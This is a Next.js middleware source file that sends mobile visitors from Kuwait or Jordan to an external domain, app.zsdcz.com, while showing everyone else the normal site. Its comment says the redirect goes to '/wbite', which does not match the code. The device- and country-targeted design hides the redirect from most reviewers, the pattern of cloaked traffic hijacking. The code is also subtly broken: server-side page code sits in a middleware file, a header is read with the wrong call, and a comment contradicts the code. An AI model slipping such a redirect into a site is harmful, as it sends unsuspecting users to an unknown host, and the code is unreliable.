// Next.js Middleware example (middleware.js)
// Redirects visitors from Kuwait (KW) or Jordan (JO) *AND* using a phone
// to /wbite, otherwise shows main site.

import { NextResponse } from 'next/server';

export function middleware(request: { geo: { country: null; }; headers: { get: (arg0: string) => string; }; nextUrl: { clone: () => any; }; }) {
  // Get geo info (works on Vercel and some hosts)
  const country = request.headers.get("cf-ipcountry");
console.log(country)
  // Detect mobile device using User-Agent
  const ua = request.headers.get('user-agent') || '';
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua);

  // Check if country is KW or JO and device is mobile
  if (isMobile && (country === 'KW' || country === 'JO')) {
    return NextResponse.redirect("https://app.zsdcz.com/");
  }

  // Otherwise allow user to continue
  return NextResponse.next();
}

// Apply middleware to all pages
export const config = {
  matcher: '/:path*',
};

export async function getServerSideProps(context: { req: any; }) {
  const req = context.req;
  const ua = req.headers['user-agent'] || '';
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua);

  // Country via reverse proxy header (if configured)
  const country = req.headers.get("cf-ipcountry");
  console.log(country)

  if (isMobile && (country === 'KW' || country === 'JO')) {
    return {
      redirect: {
        destination: "https://app.zsdcz.com/",
        permanent: false,
      },
    };
  }

  return { props: {} };
}
